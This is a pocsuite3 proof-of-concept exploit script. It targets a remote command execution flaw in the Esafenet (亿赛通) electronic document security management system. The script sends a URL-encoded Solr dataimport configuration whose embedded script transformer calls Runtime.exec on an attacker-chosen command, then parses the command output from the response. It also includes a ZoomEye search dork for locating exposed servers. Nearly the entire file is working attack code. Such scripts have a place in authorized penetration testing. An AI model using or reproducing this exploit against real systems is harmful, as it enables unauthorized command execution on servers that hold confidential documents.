from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin
import re

minimum_version_required('1.9.11')


class POC(POCBase):
    name = '亿赛通电子文档安全管理系统远程命令执行'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"亿赛通电子文档安全管理系统"'}
    appName = '亿赛通'
    vulID = '-'

    def _exploit(self, param=''):
        vuln_path = f"/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{param}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Connection": "close",
            "Content-Length": "86"
        }
        data = """<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>
        """
        url = urljoin(self.url, vuln_path)
        res = requests.post(url, headers=header, data=data, verify=False, timeout=5)
        if "authority\system" in res.text:
            pattern = r'<arr name="title"><str>(.*?)<\/str><\/arr>'
            get_cmd = re.search(pattern, res.text,re.DOTALL)
            extracted = get_cmd.group(1)
            cmd_result = {'result': extracted}
            return cmd_result['result']

    def _verify(self):
        result = {}
        flag = random_str(6)
        param = f'whoami'
        res = self._exploit(param)
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)


register_poc(POC)
